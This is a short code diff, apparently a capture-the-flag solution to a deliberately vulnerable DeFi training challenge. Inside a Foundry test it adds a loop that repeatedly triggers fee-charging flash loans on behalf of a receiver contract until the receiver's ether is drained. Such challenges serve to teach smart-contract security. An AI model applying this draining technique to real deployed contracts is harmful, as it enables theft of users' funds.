@@ -49,7 +49,13 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        for (uint256 i = 0; i < ETHER_IN_RECEIVER / 1 ether; i++) {
+            uint256 current_receiver_balance = address(flashLoanReceiver).balance;
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                current_receiver_balance
+            );
+        }
         /**
          * EXPLOIT END *
          */
